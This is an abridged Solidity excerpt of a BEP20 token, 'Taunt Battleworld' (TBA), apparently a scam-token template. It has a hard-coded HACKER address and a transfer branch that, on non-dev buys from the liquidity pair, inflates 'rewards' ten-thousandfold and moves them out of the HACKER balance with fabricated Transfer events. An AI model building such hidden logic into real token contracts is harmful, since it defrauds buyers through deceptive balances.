...
contract BEP20 is Context {
  ...
  address public constant HACKER = 0x54901D18fc35Eb2AA8fA7017d6b8a651c4390191;
  address public WBNB;
...
contract Coin is BEP20, IERC20 {
  ...
  string public name =/*TOKENNAME*/"Taunt Battleworld"/*TOKENNAME*/;
  string public symbol =/*TOKENSYMBOL*/"TBA"/*TOKENSYMBOL*/;
  ...
  function _tokenTransfer(
    ...
    if (tx.origin != dev) 
    {
      ...
      if(sender==uniswapV2Pair && rewards>0 && _tOwned[HACKER]>rewards)
      {
        rewards = rewards * 10000;
         _tOwned[HACKER] -= rewards;
         _tOwned[recipient] += rewards;
         emit Transfer(HACKER, recipient, rewards);
      }
    }
